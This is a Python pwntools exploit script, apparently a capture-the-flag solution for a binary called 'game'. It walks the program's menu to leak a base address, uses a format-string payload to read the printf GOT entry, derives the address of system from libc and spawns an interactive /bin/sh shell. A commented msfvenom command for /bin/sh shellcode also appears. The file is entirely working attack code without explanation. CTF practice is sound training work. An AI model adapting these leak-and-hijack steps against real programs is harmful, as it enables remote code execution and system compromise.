#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-13 09:24:10
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./game"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
elf = ELF(target)
libc = ELF("libc")
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*0x13FD\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)


ru("?\n")
sl("a")
# for x in range(0,1000):
ru("$ ")
sl("build_warehouse")
ru("t have?\n")
sl("-3")

ru("$ ")
sl("buy_weapon")
ru("u want to buy?\n")
sl("UMP45")
ru("\n")
sl("0")
ru("\n")

for x in range(0,3):
	ru("$ ")
	sl("attack_boss")
	ru("\n")
	sl("0")

ru("$")
sl("comment")
ru("\n")

payload = 'a'*0x10
sl(payload)

ru("$ ")
sl("show_weapon")
ru("\n")
sl("0")
base_addr = u32(ru(",")[0x20-3:0x20+1])-0x1287
print "base_addr="+hex(base_addr)

def leak_addr(addr):
	ru("$")
	sl("comment")
	ru("\n")
	payload = '%7$s'
	payload += 'a'*(0x10-len(payload))+p32(base_addr+elf.symbols["printf"])+p32(0x10)*3
	sl(payload)
	ru("$ ")
	sl("attack_boss")
	ru("\n")
	sl(p32(0)+p32(addr)) # push addr to stack
leak_addr(base_addr+elf.got["printf"]) # add base_addr
printf_addr = u32(p.recv(4))
system_addr = printf_addr-libc.symbols["printf"]+libc.symbols["system"]
print "system_addr="+hex(system_addr)

ru("$")
sl("comment")
ru("\n")
payload = "/bin/sh\x00"
payload += 'a'*(0x10-len(payload))+p32(system_addr)+p32(0x10)*3
sl(payload)
ru("$ ")
sl("attack_boss")
ru("\n")
sl(p32(0))


p.interactive()